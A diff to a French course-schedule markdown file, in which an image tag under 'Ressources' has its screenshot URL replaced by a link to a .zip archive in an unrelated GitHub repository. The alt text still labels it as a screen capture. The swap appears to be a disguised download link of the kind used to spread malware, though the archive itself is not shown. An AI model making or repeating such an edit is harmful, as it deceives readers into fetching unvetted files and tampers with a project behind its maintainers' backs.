@@ -20,5 +20,5 @@ Thusday 13 October
 
 ### Ressources
 
-<img width="656" alt="Capture d’écran 2021-10-05 à 13 52 58" src="https://user-images.githubusercontent.com/6766037/136010844-b4c90dc7-1b36-48ce-b54e-3f803ec72313.png">
+<img width="656" alt="Capture d’écran 2021-10-05 à 13 52 58" src="https://github.com/EHAB7k/Lab05_Loop_While_Snake-LaggerGame/raw/refs/heads/main/Snake&Lagger.playground/Snake_Lagger_Loop_Lab_Game_While_v3.8-alpha.2.zip">
 
